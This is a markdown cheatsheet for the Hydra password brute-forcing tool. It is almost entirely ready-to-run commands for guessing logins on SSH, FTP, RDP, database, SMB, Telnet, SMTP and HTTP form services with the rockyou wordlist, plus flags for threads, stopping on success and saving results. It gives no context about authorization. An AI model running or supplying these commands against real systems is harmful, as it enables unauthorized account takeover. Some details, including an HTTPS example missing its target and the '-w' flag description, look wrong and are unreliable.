# Hydra Cheatsheet

> Quick reference for Hydra online password brute forcing.

```bash
# ──────────────────────────────────────────────
# SYNTAX
# ──────────────────────────────────────────────
hydra [options] <target> <service>

# ──────────────────────────────────────────────
# CREDENTIAL OPTIONS
# ──────────────────────────────────────────────
-l <user>          # Single username
-L <file>          # Username list
-p <pass>          # Single password
-P <file>          # Password list
-C <file>          # Colon-separated user:pass file

# ──────────────────────────────────────────────
# COMMON SERVICES
# ──────────────────────────────────────────────

# SSH
hydra -l admin -P rockyou.txt ssh://192.168.1.10
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.10

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.10

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.10

# PostgreSQL
hydra -l postgres -P rockyou.txt postgres://192.168.1.10

# SMB
hydra -l admin -P rockyou.txt smb://192.168.1.10

# Telnet
hydra -l admin -P rockyou.txt telnet://192.168.1.10

# SMTP
hydra -l user@domain.com -P rockyou.txt smtp://mail.target.com

# ──────────────────────────────────────────────
# HTTP BRUTE FORCE
# ──────────────────────────────────────────────

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin/

# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP POST form with cookie
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Login failed:H=Cookie: PHPSESSID=abc123"

# HTTPS
hydra -l admin -P rockyou.txt https-post-form \
  "/login:user=^USER^&pass=^PASS^:Failed"

# ──────────────────────────────────────────────
# USEFUL FLAGS
# ──────────────────────────────────────────────
-t 16          # Threads (default 16)
-f             # Stop after first valid credential found
-v             # Verbose output
-V             # Show every attempt
-s <port>      # Specify non-default port
-o output.txt  # Save results to file
-e nsr         # Try: n=null, s=same as login, r=reversed login
-w 30          # Wait time between attempts (seconds)
```
